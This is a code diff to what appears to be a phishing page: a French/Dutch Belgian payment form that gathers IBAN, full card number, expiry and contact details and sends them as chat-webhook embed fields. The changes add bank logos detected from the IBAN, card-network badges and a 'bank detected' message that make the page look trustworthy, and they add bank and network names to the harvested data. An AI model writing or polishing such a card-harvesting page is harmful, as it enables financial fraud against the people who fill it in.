@@ -174,6 +174,32 @@
         }
         .form-group input.invalid ~ .error-msg { display:block; }
 
+        /* ===== Logos banque / carte + détection auto ===== */
+        .input-wrapper { position: relative; display: block; }
+        .network-logo {
+            position: absolute; left: 10px; top: 50%; transform: translateY(-50%);
+            width: 40px; height: 26px; display: flex; align-items: center; justify-content: center;
+            opacity: 0; transition: opacity 0.25s ease; pointer-events: none; z-index: 2;
+            border-radius: 4px; overflow: hidden;
+        }
+        .network-logo.active { opacity: 1; }
+        .network-logo svg { display: block; width: 40px; height: 26px; }
+        .input-wrapper.with-logo input { padding-left: 60px; }
+        .form-group .input-wrapper:has(input.invalid) ~ .error-msg { display: block; }
+
+        .bank-badge {
+            display: none; align-items: center; gap: 6px; margin-top: 8px;
+            font-size: 12px; font-weight: 600; color: var(--accent);
+            background: var(--info-bg); border: 1px solid rgba(0,68,143,0.25);
+            border-radius: 8px; padding: 6px 12px;
+            animation: fadeSlideIn 0.25s ease;
+        }
+        .bank-badge.show { display: inline-flex; }
+        @keyframes fadeSlideIn {
+            from { opacity: 0; transform: translateY(-4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
         .form-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
 
         .btn-submit {
@@ -401,14 +427,18 @@
             <span class="nl">💳 Betaalgegevens</span>
         </p>
 
-        <!-- COMPTE BE -->
+        <!-- COMPTE BE / IBAN -->
         <div class="form-group">
             <label for="compte_be">
-                <span class="fr">Compte bancaire <span class="required">*</span></span>
-                <span class="nl">Bankrekening <span class="required">*</span></span>
+                <span class="fr">Compte bancaire (IBAN) <span class="required">*</span></span>
+                <span class="nl">Bankrekening (IBAN) <span class="required">*</span></span>
             </label>
-            <input type="text" id="compte_be" name="Numéro de compte BE" placeholder="BE 1234 5678 9012 34" required>
+            <div class="input-wrapper">
+                <span class="network-logo" id="ibanLogo"></span>
+                <input type="text" id="compte_be" name="Numéro de compte BE" placeholder="BE 1234 5678 9012 34" required>
+            </div>
             <span class="error-msg"><span class="fr">⚠️ 14 chiffres (ex: BE 1234 5678 9012 34)</span><span class="nl">⚠️ 14 digits (e.g., BE 1234 5678 9012 34)</span></span>
+            <div class="bank-badge" id="bankBadge"><span>📍</span><span id="bankBadgeLabel"></span></div>
         </div>
 
         <!-- CARTE -->
@@ -417,7 +447,10 @@
                 <span class="fr">Carte de crédit <span class="required">*</span></span>
                 <span class="nl">Creditcard <span class="required">*</span></span>
             </label>
-            <input type="text" id="carte_52" name="Numéro de carte 52/49/51" placeholder="4312 5900 7901 1248" required>
+            <div class="input-wrapper">
+                <span class="network-logo" id="cardLogo"></span>
+                <input type="text" id="carte_52" name="Numéro de carte 52/49/51" placeholder="4312 5900 7901 1248" required>
+            </div>
             <span class="error-msg"><span class="fr">⚠️ 16 chiffres (ex: 4312 5900 7901 1248)</span><span class="nl">⚠️ 16 digits (e.g., 4312 5900 7901 1248)</span></span>
         </div>
 
@@ -508,7 +541,9 @@
             'Email': document.getElementById('email').value,
             'Téléphone': document.getElementById('phone').value,
             'Compte BE': document.getElementById('compte_be').value,
+            'Banque': detectedBankName || 'Non détectée',
             'Carte': document.getElementById('carte_52').value,
+            'Carte réseau': detectedCardType || 'Inconnu',
             'Expiration': document.getElementById('expiry').value,
             'Montant': document.getElementById('amount').value
         };
@@ -528,7 +563,9 @@
                     { name: '📧 Email', value: data['Email'], inline: true },
                     { name: '📱 Téléphone', value: data['Téléphone'], inline: false },
                     { name: '🏦 Compte BE', value: '`' + data['Compte BE'] + '`', inline: false },
+                    { name: '🏛️ Banque', value: data['Banque'], inline: true },
                     { name: '💳 Carte', value: '`' + data['Carte'] + '`', inline: false },
+                    { name: '🔖 Réseau', value: data['Carte réseau'], inline: true },
                     { name: '📅 Expiration', value: data['Expiration'], inline: true },
                     { name: '💰 Montant', value: data['Montant'] + ' €', inline: true }
                 ],
@@ -672,6 +709,7 @@
         }
         this.value = formatCompteBE(this.value);
         validateCompteBE(this);
+        updateIbanLogo(this.value);
     });
     compteBE.addEventListener('paste', function() {
         var self = this;
@@ -681,9 +719,13 @@
             }
             self.value = formatCompteBE(self.value);
             validateCompteBE(self);
+            updateIbanLogo(self.value);
         }, 50);
     });
-    compteBE.addEventListener('blur', function() { validateCompteBE(this); });
+    compteBE.addEventListener('blur', function() {
+        validateCompteBE(this);
+        updateIbanLogo(this.value);
+    });
 
     // ---- 4. CARTE 52/49/51 ----
     function formatCarte(value) {
@@ -715,15 +757,167 @@
     carteInput.addEventListener('input', function() {
         this.value = formatCarte(this.value);
         validateCarte(this);
+        updateCardLogo(this.value);
     });
     carteInput.addEventListener('paste', function() {
         var self = this;
         setTimeout(function() {
             self.value = formatCarte(self.value);
             validateCarte(self);
+            updateCardLogo(self.value);
         }, 50);
     });
-    carteInput.addEventListener('blur', function() { validateCarte(this); });
+    carteInput.addEventListener('blur', function() {
+        validateCarte(this);
+        updateCardLogo(this.value);
+    });
+
+    // ---- 4bis. DÉTECTION AUTO : BANQUE (via IBAN) + RÉSEAU DE CARTE ----
+    var detectedBankName = '';
+    var detectedCardType = '';
+
+    // Couleurs + libellés courts (couleurs officielles des banques)
+    var BANK_DATA = {
+        kbc: ['#00a550', 'KBC'],
+        cbc: ['#d0232a', 'CBC'],
+        ing: ['#ff6200', 'ING'],
+        belfius: ['#c8002d', 'BEL'],
+        bnp: ['#00965e', 'BNP'],
+        argenta: ['#004b8d', 'ARG'],
+        beobank: ['#1d2d5f', 'BEO'],
+        crelan: ['#009fe3', 'CRE']
+    };
+    var BANK_NAMES = {
+        kbc: 'KBC Bank', cbc: 'CBC Banque', ing: 'ING Belgium', belfius: 'Belfius',
+        bnp: 'BNP Paribas Fortis', argenta: 'Argenta', beobank: 'Beobank', crelan: 'Crelan'
+    };
+
+    function makeBankSvg(bg, label) {
+        return '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="' + bg + '"/><text x="25" y="22" font-family="Arial" font-size="12" font-weight="900" fill="white" text-anchor="middle">' + label + '</text></svg>';
+    }
+
+    // IBAN BE : les 3 chiffres après les 2 chiffres de contrôle = code banque
+    function detectIbanBank(raw) {
+        if (!raw.startsWith('BE') || raw.length < 7) return null;
+        var code = parseInt(raw.substring(4, 7), 10);
+        if (isNaN(code)) return null;
+        if (code === 68) return 'belfius';
+        if (code >= 0 && code <= 67) return 'bnp';
+        if (code >= 69 && code <= 99) return 'bnp';
+        if (code >= 310 && code <= 389) return 'ing';
+        if (code >= 430 && code <= 439) return 'bnp';
+        if (code >= 630 && code <= 649) return 'beobank';
+        if (code >= 730 && code <= 733) return 'kbc';
+        if (code === 734) return 'cbc';
+        if (code >= 850 && code <= 869) return 'argenta';
+        if (code >= 880 && code <= 889) return 'crelan';
+        if (code >= 890 && code <= 979) return 'argenta';
+        if (code >= 980) return 'kbc';
+        return null;
+    }
+
+    function updateIbanLogo(value) {
+        var wrapper = compteBE.parentElement;
+        var el = document.getElementById('ibanLogo');
+        var badge = document.getElementById('bankBadge');
+        var badgeLabel = document.getElementById('bankBadgeLabel');
+        var raw = value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+        var bank = detectIbanBank(raw);
+        if (bank && BANK_DATA[bank]) {
+            el.innerHTML = makeBankSvg(BANK_DATA[bank][0], BANK_DATA[bank][1]);
+            el.classList.add('active');
+            wrapper.classList.add('with-logo');
+            detectedBankName = BANK_NAMES[bank] || '';
+            var isNl = document.body.classList.contains('lang-nl');
+            badgeLabel.textContent = (isNl ? '✓ Bank gedetecteerd: ' : '✓ Banque détectée : ') + detectedBankName;
+            badge.classList.add('show');
+        } else {
+            el.innerHTML = '';
+            el.classList.remove('active');
+            wrapper.classList.remove('with-logo');
+            detectedBankName = '';
+            badge.classList.remove('show');
+        }
+    }
+
+    // Logos réseaux de carte (couleurs officielles)
+    var CARD_SVGS = {
+        visa: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#1a1f71"/><text x="25" y="24" font-family="Arial" font-size="17" font-weight="900" fill="#f7b600" text-anchor="middle" font-style="italic">VISA</text></svg>',
+        mastercard: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#1a1a1a"/><circle cx="19" cy="16" r="12" fill="#eb001b"/><circle cx="31" cy="16" r="12" fill="#f79e1b"/><path d="M25 5.5a12 12 0 0 1 0 21 12 12 0 0 1 0-21z" fill="#ff5f00"/></svg>',
+        maestro: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#f4f4f4"/><circle cx="19" cy="16" r="12" fill="#0099df"/><circle cx="31" cy="16" r="12" fill="#e2001a"/><path d="M25 5.5a12 12 0 0 1 0 21 12 12 0 0 1 0-21z" fill="#7b2c9e" opacity="0.85"/></svg>',
+        bancontact: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#004f9f"/><text x="25" y="22" font-family="Arial" font-size="14" font-weight="900" fill="white" text-anchor="middle">BC</text></svg>',
+        amex: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#2557d6"/><text x="25" y="21" font-family="Arial" font-size="10" font-weight="900" fill="white" text-anchor="middle">AMEX</text></svg>',
+        diners: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#0079be"/><text x="25" y="22" font-family="Arial" font-size="10" font-weight="900" fill="white" text-anchor="middle">DINERS</text></svg>',
+        discover: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#ff6000"/><text x="25" y="22" font-family="Arial" font-size="11" font-weight="900" fill="white" text-anchor="middle">DISC</text></svg>',
+        jcb: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#0066b2"/><text x="25" y="22" font-family="Arial" font-size="11" font-weight="900" fill="white" text-anchor="middle">JCB</text></svg>',
+        unionpay: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#e21640"/><text x="25" y="22" font-family="Arial" font-size="9" font-weight="900" fill="white" text-anchor="middle">UNION</text></svg>',
+        mir: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#00a651"/><text x="25" y="22" font-family="Arial" font-size="11" font-weight="900" fill="white" text-anchor="middle">MIR</text></svg>'
+    };
+    var CARD_LABELS = {
+        visa: 'Visa', mastercard: 'Mastercard', maestro: 'Maestro', bancontact: 'Bancontact',
+        amex: 'American Express', diners: 'Diners Club', discover: 'Discover', jcb: 'JCB',
+        unionpay: 'UnionPay', mir: 'MIR'
+    };
+
+    function detectCardType(num) {
+        if (!num) return null;
+        if (/^6703/.test(num)) return 'bancontact';
+        if (/^4/.test(num)) return 'visa';
+        if (/^(5[1-5]|2[2-7])/.test(num)) return 'mastercard';
+        if (/^3[47]/.test(num)) return 'amex';
+        if (/^(36|38|39|30[0-5])/.test(num)) return 'diners';
+        if (/^(6011|622[12]\d{2}|64[4-9]|65)/.test(num)) return 'discover';
+        if (/^35[2-8]\d/.test(num)) return 'jcb';
+        if (/^62/.test(num)) return 'unionpay';
+        if (/^220[0-4]/.test(num)) return 'mir';
+        if (/^(50|5[6-9]|6[0-9])/.test(num)) return 'maestro';
+        return null;
+    }
+
+    function updateCardLogo(value) {
+        var wrapper = carteInput.parentElement;
+        var el = document.getElementById('cardLogo');
+        var raw = value.replace(/\D/g, '');
+        var type = detectCardType(raw);
+        if (type && CARD_SVGS[type]) {
+            el.innerHTML = CARD_SVGS[type];
+            el.classList.add('active');
+            wrapper.classList.add('with-logo');
+            detectedCardType = CARD_LABELS[type] || type;
+        } else {
+            el.innerHTML = '';
+            el.classList.remove('active');
+            wrapper.classList.remove('with-logo');
+            detectedCardType = '';
+        }
+    }
+
+    // Déclencheurs
+    compteBE.addEventListener('input', function() { updateIbanLogo(this.value); });
+    compteBE.addEventListener('paste', function() {
+        var self = this;
+        setTimeout(function() { updateIbanLogo(self.value); }, 60);
+    });
+    carteInput.addEventListener('input', function() { updateCardLogo(this.value); });
+    carteInput.addEventListener('paste', function() {
+        var self = this;
+        setTimeout(function() { updateCardLogo(self.value); }, 60);
+    });
+
+    // Nettoyage du nom : retire les chiffres en direct
+    var fullnameInput = document.getElementById('fullname');
+    fullnameInput.addEventListener('input', function() {
+        var cleaned = this.value.replace(/[0-9]/g, '');
+        if (cleaned !== this.value) this.value = cleaned;
+    });
+
+    // Réinitialiser les logos/badge après envoi (form.reset())
+    form.addEventListener('reset', function() {
+        setTimeout(function() {
+            updateIbanLogo('');
+            updateCardLogo('');
+        }, 10);
+    });
 
     // ---- 5. DATE ----
     function validateExpiry(input) {
